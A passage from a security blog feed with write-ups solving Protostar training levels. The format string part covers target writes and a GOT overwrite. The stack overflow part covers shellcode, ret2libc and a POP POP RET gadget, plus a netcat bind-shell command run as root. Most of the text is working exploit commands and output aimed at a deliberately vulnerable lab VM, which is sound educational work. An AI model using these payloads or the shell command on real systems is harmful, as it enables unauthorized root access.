(gdb) r $(perl -e &lsquo;print &ldquo;\x38\x96\x04\x08BAAAA&rdquo; . &ldquo;%08x."x132 . &rdquo;%n"&rsquo;)
[snip]
Breakpoint 1, vuln (</p>

<pre><code>                string=0xbffff704 "8\226\004\bBAAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%"...) at format1/format1.c:12
</code></pre>

<p>12  format1/format1.c: No such file or directory.</p>

<pre><code>in format1/format1.c
(gdb) x/wx &amp;target
0x8049638 &lt;target&gt;: 0x000004ad
(gdb) c
Continuing.
1.0000000f.bffff6db.00000000.00000000.d2000000.3398faa1.0022db30.da5bc6eb.6944a17d.00363836.00000000.00000000.706f2f00.72702f74.736f746f.2f726174.2f6e6962.6d726f66.00317461.you have modified the target :)
</code></pre>

<p>```</p>

<p>Note we replace the <code>%x</code> at the end with a <code>%n</code>, thus allowing us to write bytes into the specified address.</p>

<h2>Format String Level 02</h2>

<p>The learning curve after level 1 is much lower for the remaining two levels.  This level is identical to 1, except we need to actually write a specific value (0x64).  Let&rsquo;s begin by first finding our target address:</p>

<p><code>
$ objdump -t format2 | grep target
080496e4 g     O .bss   00000004              target
</code></p>

<p>Modifying my script a bit (since input is now via fgets):</p>

<p><code>
$ python /home/user/test.py
[!] Searching for offset..
[!] Format found at offset 4
[!] String: echo $(perl -e 'print "AAAAAAAA" . "%08x."x4' . "%x") | /opt/protostar/bin/format2
</code></p>

<p>Not so far up the stack this time.  Lets plug in our address:</p>

<p><code>
$ echo $(perl -e 'print "\xe4\x96\x04\x08" . "%x."x3 . "%n"') | /opt/protostar/bin/format2
��200.b7fd8420.bffff604.
target is 26 :(
</code></p>

<p>Not quite there.  Recall that we&rsquo;re writing the number of bytes printed; so we just need to jack up our output formatter, and&hellip;</p>

<p><code>
$ echo $(perl -e 'print "\xe4\x96\x04\x08" . "%19x."x3 . "%n"') | /opt/protostar/bin/format2
��                200.           b7fd8420.           bffff604.
you have modified the target :)
</code></p>

<h2>Format String Level 03</h2>

<p>This level requires us to more accurately write specific data to an address; lets again find our target:</p>

<p><code>
$ objdump -t format3 | grep target
080496f4 g     O .bss   00000004              target
</code></p>

<p>And again running our script:</p>

<p><code>
$ python /home/user/test.py
[!] Searching for offset..
[!] Format found at offset 12
[!] String: echo $(perl -e 'print "AAAAAAAA" . "%08x."x12' . "%x") | /opt/protostar/bin/format3
</code></p>

<p>And if we test this out:</p>

<p><code>
$ python -c 'print "\xf4\x96\x04\x08" + "%x."*11 + "%n"' | /opt/protostar/bin/format3
��0.bffff5c0.b7fd7ff4.0.0.bffff7c8.804849d.bffff5c0.200.b7fd8420.bffff604.
target is 0000004c :(
</code></p>

<p>So we&rsquo;ve validated we can modify the target, but we need to modify all 4 bytes.  At this point, I discovered that we could simply continue to add on data to the value, pop out, and write another byte.  This, however, was tedious, and filled up my command line quickly.  It was at this point that I switched to using direct parameter access symbols.  Essentially, this allows us to directly access a variable from the stack, without having to continually pop values from it.  For example, if we wanted to access the 11th parameter, we would simply use <code>%11$x</code>.  If we return briefly to format1, we can see this in action below:</p>

<p><code>
$ ./format1 $(perl -e 'print "AAAAAA"')'_%128$x';printf "\n"
AAAAAA_41414141
</code></p>

<p>This is a much cleaner way of reading values off the stack.  Testing this on level 3:</p>

<p><code>
$ python -c 'print "AAAABBBBCCCCDDDD" + "_%12$x_%13$x_%14$x_%15$x"' | ./format3
AAAABBBBCCCCDDDD_41414141_42424242_43434343_44444444
target is 00000000 :(
</code></p>

<p>And to verify we&rsquo;re there, we can substitute the characters for addresses, and replace the <code>$x</code> with a <code>$n</code> to write into those addresses:</p>

<p><code>
$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%12$n%13$n%14$n%15$n"' | ./format3
��������
target is 10101010 :(
</code></p>

<p>Figuring out the correct padding values requires some simple math:</p>

<p><code>
first byte = 0x44 - 0x10
second     = 0x55 - 0x44
third      = 0x02 - 0x55
</code></p>

<p>Note we&rsquo;ve left off the fourth byte, we&rsquo;ll return to this in a second.  Simple math tells us that the first byte padding value should be 52:</p>

<p><code>
$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52u%12$n%13$x%14$x%15$x"' | ./format3
��������                                                   080496f580496f680496f7
target is 00000044 :(
</code></p>

<p>The second byte is 17, and the third byte is -83, but if we wrap that we get 173 (0x02 &ndash; 0x55 &amp; 0xff).  This results in:</p>

<p><code>
$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52u%12$n%17u%13$n%173u%14$n%15$x"' | ./format3
��������                                                   0       3221222896                                                                                                                                                                   308684389280496f7
you have modified the target :)
</code></p>

<p>As noted earlier, we don&rsquo;t actually have to write anything to the final byte, as it is set due to a previous overflow.</p>

<h2>Format String Level 04</h2>

<p>The final level in the format string section, this one requires us to redirect execution to another method, <code>hello</code>.  This probably means we&rsquo;ll need to overwrite a value in the GOT, or the Global Offset Table, which acts as a trampoline for dynamic libraries.  Let&rsquo;s start by finding the hello function that we want to redirect execution flow to:</p>

<p><code>
$ objdump -M intel -t format4 | grep hello
080484b4 g     F .text  0000001e              hello
</code></p>

<p>And running our script:</p>

<p><code>
$ python /home/user/test.py
[!] Searching for offset..
[!] Format found at offset 4
[!] String: echo $(perl -e 'print "AAAAAAAA" . "%08x."x4' . "%x") | /opt/protostar/bin/format4
</code></p>

<p>If we take a look at the <a href="http://webcache.googleusercontent.com/search?q=cache:KFYMJlYdHdMJ:exploit-exercises.com/protostar/format4+&amp;cd=3&amp;hl=en&amp;ct=clnk&amp;gl=us">code</a>, we see a call to exit right after the vulnerable printf.  This is the entry we want to overwrite.  We now need that address:</p>

<p><code>
$ objdump --dynamic-reloc format4 | grep exit
08049718 R_386_JUMP_SLOT   _exit
08049724 R_386_JUMP_SLOT   exit
</code></p>

<p>So we need to overwrite 0x08049724 with 0x080484b4.  Let&rsquo;s give this a shot:</p>

<p>```
user@protostar:/opt/protostar/bin$ python -c &lsquo;print &ldquo;\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08&rdquo; + &ldquo;%4$n%5$n%6$n%7$n&rdquo;&rsquo; > /tmp/input
user@protostar:/opt/protostar/bin$ gdb -q ./format4
Reading symbols from /opt/protostar/bin/format4&hellip;done.
(gdb) r &lt; /tmp/input
Starting program: /opt/protostar/bin/format4 &lt; /tmp/input
$�%�&amp;�'�</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x10101010 in ?? ()
(gdb)
```</p>

<p>We&rsquo;ve verified we&rsquo;re at the right location and can control EIP; notice, however, that the two addresses only differ by 2 bytes.  If we use the <code>$hn</code>, or a short 2 byte write, we can get by with less code:</p>

<p>```
user@protostar:/opt/protostar/bin$ python -c &lsquo;print &ldquo;\x24\x97\x04\x08&rdquo; + &ldquo;%4$hn&rdquo;&rsquo; > /tmp/input
user@protostar:/opt/protostar/bin$ gdb -q ./format4
Reading symbols from /opt/protostar/bin/format4&hellip;done.
(gdb) r &lt; /tmp/input
Starting program: /opt/protostar/bin/format4 &lt; /tmp/input
$�</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x08040004 in ?? ()
```</p>

<p>More simple math, <code>p/d 0x84b4 - 0x0004</code>, gives us 33968.</p>

<p><code>
$ python -c 'print "\x24\x97\x04\x08" + "%33968u%4$hn"' | ./format4
[snip whitespace]
code execution redirected! you win
</code></p>

<p>And that&rsquo;s it!  Next up, heap exploitation.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Protostar solutions - Stack Levels]]></title>
    <link href="http://hatRiot.github.io/blog/2013/03/30/protostar-solutions-stack-levels/"/>
    <updated>2013-03-30T23:21:16-07:00</updated>
    <id>http://hatRiot.github.io/blog/2013/03/30/protostar-solutions-stack-levels</id>
    <content type="html"><![CDATA[<p>Part two of the three <a href="http://exploit-exercises.com/">exploit exercises</a> available.  This set of challenges focused purely on memory corruption via stack overflows; the challenges here weren&rsquo;t too difficult, but I wanted to work through them anyway.  A post with the remaining levels will follow.</p>

<h3>Stack Level 00</h3>


<p>Introductory level that introduces stack layout; here, the <code>modified</code> variable follows a 64 byte array on the stack.  If the stack is overwritten, the modified variable will be run over.</p>

<p><code>
user@protostar:~$ python -c "print 'A'*70" | ./stack0
you have changed the 'modified' variable
user@protostar:~$
</code></p>

<h3>Stack Level 01</h3>


<p>Another introductory level that forces you to overwrite a particular variable with a specific value.  Essentially we need to take level 00 and figure out exactly where to overwrite the modified variable.  This can be trivially guessed, considering we know the buf size.  Remembering that this architecture is little endian:</p>

<p><code>
user@protostar:~$ ./stack1 $(perl -e 'print "A"x64 . "dcba"')
you have correctly got the variable to the right value
user@protostar:~$
</code></p>

<p>It&rsquo;s also worth noting that, if you&rsquo;re loading this into gdb, the modified variable is volatile, so if you <code>p &amp;modified</code> and don&rsquo;t get the right value, don&rsquo;t worry.  You&rsquo;re not crazy.</p>

<h3>Stack Level 02</h3>


<p>Almost a carbon copy of level 1, except this time our input vector is an environmental variable.</p>

<p><code>
user@protostar:~$ export GREENIE=$(perl -e 'print "A"x64 . "\x0a\x0d\x0a\x0d"')
user@protostar:~$ ./stack2
you have correctly modified the variable
</code></p>

<h3>Stack Level 03</h3>


<p>This level has us redirecting code flow to another function present in the source.  The buffer length is the same as the previous three, so we just need to find out where the function lies.</p>

<p><code>
user@protostar:~$ objdump -d stack3 | grep win
08048424 &lt;win&gt;:
user@protostar:~$ echo $(perl -e 'print "A"x64 . "\x24\x84\x04\x08"') | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
user@protostar:~$
</code></p>

<h3>Stack Level 04</h3>


<p>Instead of overwriting a function call, we&rsquo;ll be overwriting a return address.  When the function exits, it pops the current stack frame off and returns the saved frame pointer, so we need only overflow the address immediately following EBP.</p>

<p><code>
user@protostar:~$ objdump -d stack4 | grep win
080483f4 &lt;win&gt;:
user@protostar:~$ perl -e 'print "A"x76 . "\xf4\x83\x04\x08"' | ./stack4
code flow successfully changed
Segmentation fault
user@protostar:~$
</code></p>

<h3>Stack Level 05</h3>


<p>There&rsquo;s no real flag here aside from getting a shell, so we&rsquo;ll need some shellcode now.  Disclaimer: I spent a good deal of time trying to get shellcode working for this, and would continually brick wall at the same spot:</p>

<p>```
(gdb) ni
Executing new program: /bin/dash
Error in re-setting breakpoint 1: Function &ldquo;main&rdquo; not defined.</p>

<p>Program exited normally.
(gdb)
```</p>

<p>During one of my googling escapades, I haphazardly clicked <a href="http://www.mattandreko.com/2011/12/exploit-exercises-protostar-stack-5.html">this</a> link from someone having the exact same issues with this level.  What should be a very simple buffer overflow turned into a very wonky, absurd tumble through some obscure shellcode issues.  In the end, I came up with this solution:</p>

<p>```
user@protostar:/opt/protostar/bin$ perl -e &lsquo;print &ldquo;A"x76 . &rdquo;\x80\xf7\xff\xbf" . &ldquo;\x90"x9 . &rdquo;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"&rsquo; | ./stack5</p>

<h1>whoami</h1>

<p>root
#
```</p>

<h3>Stack Level 06</h3>


<p>This level forces us to place our shellcode in a specific path; i.e. out of userland.  We can&rsquo;t just stick it onto the stack, and we can&rsquo;t place it in an environmental variable.  Instead, we must use ret2[libc|strcpy|gets|etc] or ROP.  It verifies the function&rsquo;s return address by calling <code>__built_return_address(0)</code>, which will return the current function&rsquo;s return address.</p>

<p>This one was pretty fun, as I was able to leverage the ret2libc to pull it off.  I used c0ntext&rsquo;s <a href="http://css.csail.mit.edu/6.858/2012/readings/return-to-libc.pdf">ret2libc</a> demonstration paper as reference.  I based most of my work off the previous level, and modified it only by adding system() and exit() addresses.  My payload in the end looked like this:</p>

<p><code>[80 bytes junk | system() address | exit() address | command]</code></p>

<p>For this example, I have my command stashed in the GETME environmental variable:</p>

<p><code>
user@protostar:/opt/protostar/bin$ export GETME=/bin/sh
user@protostar:/opt/protostar/bin$ perl -e 'print "A"x80 . "\xb0\xff\xec\xb7" . "\xc0\x60\xec\xb7" . "\x86\xff\xff\xbf";' | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA�����`췆���
user@protostar:/opt/protostar/bin$ export GETME=/usr/bin/whoami
user@protostar:/opt/protostar/bin$ perl -e 'print "A"x80 . "\xb0\xff\xec\xb7" . "\xc0\x60\xec\xb7" . "\x80\xff\xff\xbf";' | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA�����`췀���
root
user@protostar:/opt/protostar/bin$
</code></p>

<p>I wasn&rsquo;t able to get /bin/sh launched with a system() call, and after checking the man page, it appears that system drops root privileges.  My second thought was to simply open up a reverse shell:</p>

<p><code>
user@protostar:/opt/protostar/bin$ export GETME="/bin/nc -l -p 5555 -e /bin/sh"
user@protostar:/opt/protostar/bin$ perl -e 'print "A"x80 . "\xb0\xff\xec\xb7" . "\xc0\x60\xec\xb7" . "\x72\xff\xff\xbf";' | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA�����`��r���
</code></p>

<p>I now had a root shell listening on port 5555.</p>

<h3>Stack Level 07</h3>


<p>The final stack level is almost exactly like the previous level, however this time when it returns from getpath(), it returns strdup(buffer), which returns a pointer to a duplicate string of buffer.  The address range is also now much more restrictive; disabling any address matching 0xb0000000.  The exploit page notes that we should be thinking about a ret2text to exploit this, so I started thinking of ways to ret2plt or ret2dl-resolve, but in the end decided those were likely too advanced for such a simple level.  Instead, I objdump&rsquo;d the binary in search of a POP POP RET, which would bypass the addressing filter and allow me to take control over EIP.  The first one I found was at <code>0x8048492</code>.  After some twiddling, I discovered the following would lead me to code execution: <code>perl -e 'print "A"x80 . "\x92\x84\x04\x08" . "\x90"x8' . "\xcc"x16 | ./stack7</code>.  So the payload will look like this <code>[80 bytes junk | POP POP RET | 8 bytes junk | shellcode]</code></p>

<p>I dumped the shellcode from level 5 into this, but for some reason the shell would only spawn if running in gdb:</p>

<p>```
user@protostar:/opt/protostar/bin$ perl -e &lsquo;print &ldquo;A"x80 . &rdquo;\x92\x84\x04\x08" . &ldquo;\x90"x8 . &rdquo;\xac\xf7\xff\xbf" . &ldquo;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&rdquo;&rsquo; > /tmp/input
user@protostar:/opt/protostar/bin$ gdb ./stack7
Reading symbols from /opt/protostar/bin/stack7&hellip;done.
(gdb) r &lt; /tmp/input
Starting program: /opt/protostar/bin/stack7 &lt; /tmp/input
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA��������������1�1۰ ̀Sh/ttyh/dev��1�f� &lsquo;�̀1�Ph//shh/bin��PS�ᙰ</p>

<p>Executing new program: /bin/dash
$ exit
user@protostar:/opt/protostar/bin$ ./stack7 &lt; /tmp/input
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA��������������1�1۰ ̀Sh/ttyh/dev��1�f� &lsquo;�̀1�Ph//shh/bin��PS�ᙰ</p>

<p>Segmentation fault
user@protostar:/opt/protostar/bin$
```</p>

<p>Where <code>\xac\xf7\xff\xbf</code> is the address of shellcode.  Instead I threw shellcode into an environmental variable and leveraged Jon Ericson&rsquo;s getenvaddr application to find the offset:</p>

<p><code>``
user@protostar:/opt/protostar/bin$ export GETME=</code>perl -e &lsquo;print &ldquo;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&rdquo;&rsquo;`
user@protostar:/opt/protostar/bin$ /tmp/test GETME ./stack7
GETME will be at 0xbfffff58
user@protostar:/opt/protostar/bin$ perl -e &lsquo;print &ldquo;A"x80 . &rdquo;\x92\x84\x04\x08" . &ldquo;\x90"x8 . &rdquo;\x58\xff\xff\xbf"&rsquo; > /tmp/input
user@protostar:/opt/protostar/bin$ ./stack7 &lt; /tmp/input
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA����������X���</p>

<h1>whoami</h1>

<p>root</p>

<h1></h1>

<p>```</p>

<p>Overall these levels were pretty basic, but I&rsquo;m looking forward to digging into Fusion for more advanced flags.</p>
]]></content>
  </entry>
  
</feed>
